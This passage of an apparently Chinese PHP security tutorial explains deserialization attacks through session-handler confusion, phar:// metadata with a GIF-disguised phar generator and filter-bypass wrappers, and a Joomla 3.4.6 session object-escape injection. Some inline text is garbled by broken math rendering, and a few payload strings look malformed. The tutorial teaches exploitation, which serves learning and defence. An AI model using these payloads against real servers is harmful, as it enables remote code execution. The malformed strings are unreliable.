回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</p>\n</blockquote>\n<p>可以看到 PHP 能自动反序列化数据的前提是，现有的会话数据是以特殊的序列化格式存储。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//那么上一个例子的payload是：</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class user&#123;</span><br><span class=\"line\">        var $name;</span><br><span class=\"line\">        var $age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $a = new user();</span><br><span class=\"line\">    $a-&gt;name = &quot;bmjoker&quot;;</span><br><span class=\"line\">    $a-&gt;age = &quot;888&quot;;</span><br><span class=\"line\">    echo serialize($a);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class=\"line\">我们只需要在前面加个|</span><br><span class=\"line\">|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class=\"line\">此时session中的username的值为</span><br><span class=\"line\">|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class=\"line\">使用php引擎读取时</span><br><span class=\"line\">|后面的全部会变成value值</span><br><span class=\"line\">就可以出发__wakeup魔法方法</span><br></pre></td></tr></table></figure>\n<p>但这种方法是在可以对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mtext>进行赋值的情况下实现的，那如果代码中不存在对</mtext></mrow><annotation encoding=\"application/x-tex\">_SESSION进行赋值的情况下实现的，那如果代码中不存在对</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord cjk_fallback\">进</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">赋</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">情</span><span class=\"mord cjk_fallback\">况</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">实</span><span class=\"mord cjk_fallback\">现</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">那</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">代</span><span class=\"mord cjk_fallback\">码</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">存</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord cjk_fallback\">对</span></span></span></span>_SESSION 变量赋值的情况下又该如何利用？</p>\n<p>在 PHP 中还存在一个 upload_process 机制，即自动在 $_SESSION 中创建一个键值对（key:value），value 中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用 session 实时返回上传的进度。</p>\n<h4 id=\"phar伪协议触发php反序列化\"><a class=\"markdownIt-Anchor\" href=\"#phar伪协议触发php反序列化\">#</a> phar 伪协议触发 php 反序列化</h4>\n<p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize ()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的 Black Hat 上提出利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。</p>\n<p><strong>phar 介绍和漏洞原理</strong></p>\n<p>phar 就是 php 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与 file://，php:// 等类似，也是一种流包装器。</p>\n<p><strong>phar 文件有四部分构成</strong>：</p>\n<p><strong>1. a stub</strong></p>\n<p>识别 phar 拓展的标识，格式为：xxx<?php xxx; __HALT_COMPILER();?>，对应的函数 Phar::setStub。前期内容不限，但必须以 __HALT_COMPILER ();?&gt; 结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p>\n<p><strong>2. a manifest describing the contents</strong></p>\n<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用的核心部分。对应函数 Phar::setMetadata— 设置 phar 归档元数据。</p>\n<p><strong>3. the file contents</strong></p>\n<p>被压缩文件的内容。</p>\n<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong></p>\n<p>签名，放在文件末尾。对应函数 Phar :: stopBuffering— 停止缓冲对 Phar 存档的写入请求，并将更改保存到磁盘。</p>\n<p><strong>这里有两个关键点：</strong></p>\n<ol>\n<li>\n<p><strong>文件标识</strong>，必须以 __HALT_COMPILER ();?&gt; 结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者 pdf 文件来绕过一些上传限制</p>\n</li>\n<li>\n<p><strong>反序列化</strong>，phar 存储的 meta-data 信息以序列化方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件时，文件内容会被解析成 phar 对象，然后 phar 对象内的 meta-data 会被反序列化。</p>\n</li>\n</ol>\n<p>meta-data 是用 serialize () 生成并保存在 phar 文件中，当内核调用 phar_parse_metadata () 解析 meta-data 数据时，会调用 php_var_unserialize () 对其进行反序列化操作，因此会造成反序列化漏洞。</p>\n<p>而在一些上传点，我们可以更改 phar 的文件头并且修改其后缀名绕过检测，如：test.gif，里面的 meta-data 却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过 + 执行的方法。</p>\n<p>生成 phar 文件的代码如下：</p>\n<p>phar.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    //反序列化payload构造</span><br><span class=\"line\">    class TestObject &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @unlink(&quot;phar.phar&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //实例一个phar对象供后续操作，后缀名必须为phar</span><br><span class=\"line\">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class=\"line\">    //开始缓冲对phar的写操作 </span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    </span><br><span class=\"line\">    //设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br><span class=\"line\">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class=\"line\"></span><br><span class=\"line\">    //将反序列化的对象放入该文件中</span><br><span class=\"line\">    $o = new TestObject();</span><br><span class=\"line\">    $o-&gt;data=&#x27;i am bmjoker&#x27;;</span><br><span class=\"line\">    //将自定义的归档元数据meta-data存入manifest</span><br><span class=\"line\">    $phar-&gt;setMetadata($o);</span><br><span class=\"line\"></span><br><span class=\"line\">    //phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br><span class=\"line\">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;bmjoker&quot;); </span><br><span class=\"line\">    //停止缓冲对phar的写操作</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>\n<table>\n<thead>\n<tr>\n<th><em><strong>* 受影响的文件操作函数列表 *</strong></em></th>\n<th>** **</th>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fileatime</td>\n<td>filectime</td>\n<td>file_exists</td>\n<td>file_get_contents</td>\n<td>touch</td>\n<td>get_meta_tags</td>\n</tr>\n<tr>\n<td>file_put_contents</td>\n<td>file</td>\n<td>filegroup</td>\n<td>fopen</td>\n<td>hash_file</td>\n<td>get_headers</td>\n</tr>\n<tr>\n<td>fileinode</td>\n<td>filemtime</td>\n<td>fileowner</td>\n<td>fileperms</td>\n<td>md5_file</td>\n<td>getimagesize</td>\n</tr>\n<tr>\n<td>is_dir</td>\n<td>is_executable</td>\n<td>is_file</td>\n<td>is_link</td>\n<td>sha1_file</td>\n<td>getimagesizefromstring</td>\n</tr>\n<tr>\n<td>is_readable</td>\n<td>is_writable</td>\n<td>is_writeable</td>\n<td>parse_ini_file</td>\n<td>hash_update_file</td>\n<td>imageloadfont</td>\n</tr>\n<tr>\n<td>copy</td>\n<td>unlink</td>\n<td>stat</td>\n<td>readfile</td>\n<td>hash_hmac_file</td>\n<td>exif_imagetype</td>\n</tr>\n</tbody>\n</table>\n<p>这些函数里面可以使用 phar 协议，当然还有常用的文件包含的几个函数 include、include_once、requrie、require_once</p>\n<p>对刚才生成的 phar 使用文件操作函数实现反序列化读取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class TestObject&#123;</span><br><span class=\"line\">        function __destruct()&#123;</span><br><span class=\"line\">            echo $this-&gt;data;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $filename =  &quot;phar://phar.phar/test.txt&quot;;</span><br><span class=\"line\">    file_get_contents($filename);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x10\"><a class=\"markdownIt-Anchor\" href=\"#0x10\">#</a> 0x10</h4>\n<p>upload_file.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class=\"line\">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class=\"line\">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class=\"line\">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class=\"line\">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class=\"line\">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class=\"line\">        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>upload_file.html</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=&quot;http://127.0.0.1/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>file_un.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class=\"line\">class AnyClass&#123;</span><br><span class=\"line\">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class=\"line\">    function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval($this -&gt; output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_exists($filename);   // 漏洞点</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>upload_file.php 对上传文件的类型，后缀进行了判断，限制为 GIF 文件。而 file_un.php 文件主要使用 file_exists () 判断文件是否存在，并且存在魔术方法__destruct ()。大概思路为首先根据 file_un.php 写一个生成 phar 的 php 文件，当然需要绕过为 gif 的限制，所以需要加 GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar，修改后缀为 gif，上传到服务器，然后利用 file_exists，使用 phar:// 执行代码。</p>\n<p>构造 payload 代码 eval.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class AnyClass&#123;</span><br><span class=\"line\">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class=\"line\">    function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval($this -&gt; output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class=\"line\">$phar -&gt; startBuffering();</span><br><span class=\"line\">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class=\"line\">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class=\"line\">$object = new AnyClass();</span><br><span class=\"line\">$object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class=\"line\">$phar -&gt; setMetadata($object);</span><br><span class=\"line\">$phar -&gt; stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>访问 eval.php，会在当前目录生成 phar.phar，然后修改后缀 gif</p>\n<p><strong>漏洞利用条件</strong></p>\n<p>\\1. phar 文件要能够上传到服务器端（如 GET、POST），并且要有 file_exists ()，fopen ()，file_get_contents ()，include () 等文件操作的函数</p>\n<p>\\2. 要有可用的魔术方法作为 &quot;跳板&quot;；</p>\n<p>\\3. 文件操作函数的参数可控，且：，/，phar 等特殊字符没有被过滤。</p>\n<p>虽然某些函数能够支持 phar:// 的协议，但是如果目标服务器没有关闭 phar.readonly 时，就不能正常执行反序列化操作。</p>\n<p><strong>在禁止 phar 开头的情况下的替代方法:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://phar://phar.phar/test.txt</span><br><span class=\"line\"></span><br><span class=\"line\">compress.bzip2://phar://phar.phar/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure>\n<p>虽然会报 warning，但是还是会执行。</p>\n<h3 id=\"joomla-346对象逃逸反序列化执行\"><a class=\"markdownIt-Anchor\" href=\"#joomla-346对象逃逸反序列化执行\">#</a> Joomla  3.4.6 对象逃逸反序列化执行</h3>\n<p>Joomla 反序列化漏洞的主要原因是：</p>\n<blockquote>\n<p>Joomla 不论账号密码是否正确，都会把登录的用户名和密码，通过序列化的方式存储在 session 表中，再以反序列化的方式读取 session 表中的内容。由于 protected 修饰的变量在序列化的时候，会变成 \\x00 + * + \\x00 + [变量名] 的形式，而 mysql 无法保存 NULL 字节的数据，所以在向 session 表写入的过程中会将 \\x00*\\x00 替换为 \\0\\0\\0 ，同样在读取 session 表中的内容的时候会再次转换，然后进行反序列化。如果在向 session 表存储的过程中构造恶意构造一些 \\0\\0\\0，那么在进行反序列化的时候就会由于字节数对不上，导致 “溢出” ，使得反序列化对象逃逸出来。</p>\n</blockquote>\n<p>如果上面这段没看懂，可以看上面利用章节的对象逃逸，如果还看不懂就退学吧</p>\n<p>尝试使用错误的账号密码登录，查看一下 session 表中的内容：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028001846145-1227489260.png\" alt=\"img\"></p>\n<p>在登录过程中，会有一个 303 的跳转，这个跳转是先把用户的输入经过序列化存储在 session 表中，读取的时候再从 session 表中取出数据进行反序列化，进行账号密码对比</p>\n<p>通过序列化写入 session 表的具体代码如下：</p>\n<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; write()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028225321914-653179029.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225321914-653179029.png\" alt=\"img\"></a></p>\n<p>因为 protected 修饰的变量在序列化后会变成这种形式：\\x00 + * + \\x00 + [变量名]，而 mysql 无法保存 NULL 字节的数据，所以在代码中可以看到在写入 session 表的过程中会将 \\x00*\\x00 替换为 \\0\\0\\0 来进行存储，就比如 Registry 类下 protected 修饰的 $data 变量，序列化存储为：</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028231208408-1317263109.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028231208408-1317263109.png\" alt=\"img\"></a></p>\n<p>通过反序列化读取 session 表的具体代码如下：</p>\n<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; read()</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225519116-1363963610.png\" alt=\"img\"></p>\n<p>在读取时会重新把 \\0\\0\\0 替换为 \\x00*\\x00 来进行反序列化。</p>\n<p>因此反序列化存入 session 表中的数据比原始数据要多 3 个字节</p>\n<p>如果传入的用户名为 \\0\\0\\0admin，序列化写入 session 表中的数据为：</p>\n<p>在调用 read 方法进行读取时会先将 \\0\\0\\0 转换为 N*N（\\x00 为空字节为方便展示这里使用 N 代替）：</p>\n<p>\\0\\0\\0admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:&quot;username&quot;;s:11:&quot;N*Nadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;</span><br></pre></td></tr></table></figure>\n<p>因为 read 之后长度变短了 3 个字节，在反序列化的时候 username 的值为 s:11:“N<em>Nadmin&quot;，但是实际只有 8 个字节，为了满足反序列化的规则，就会吃掉后面 3 个字节的数据，直至凑齐 11 个字符，也就是 s:11:&quot;N</em>Nadmin”;s。</p>\n<p>利用这个思路，足够多的 \\0\\0\\0 就可以将 password 字段的数据逃逸出来，构造如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</span><br></pre></td></tr></table></figure>\n<p>read () 之后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345</span><br></pre></td></tr></table></figure>\n<p>username 的值为 N<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN*N&quot;;s:8:“password”;s:6:&quot;12345，后面补上 &quot; 和；就成功逃逸出来了</p>\n<p>实现对象注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345&quot;;s:2:&quot;HS&quot;:O:15:&quot;ObjectInjection&quot;</span><br></pre></td></tr></table></figure>\n<p>这里来分析一下利用链，通过搜索 eval/assert/call_user_func… 这类可以利用并且参数可控的危险函数，可以找到用于构造执行链的类：</p>\n<p>这几个文件调取 call_user_func 的方式都相同，来看一下 libraries\\joomla\\database\\driver\\mysqli.php 中方法的具体实现</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221114210130490.png\" alt=\"image-20221114210130490\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031162618304-261047353.png\" alt=\"img\"></p>\n<p>当 JDatabaseDriverMysqli 这个类的对象被调用，在结束时都会调用析构函数__destruct，__destruct 中会调用 disconnect () 方法。</p>\n<p>而当<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>为</mtext><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>的时候，就会调用</mtext><mi>c</mi><mi>a</mi><mi>l</mi><msub><mi>l</mi><mi>u</mi></msub><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>n</mi><msub><mi>c</mi><mi>a</mi></msub><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">this-&gt;connection为true的时候，就会调用call_user_func_array(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">调</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord 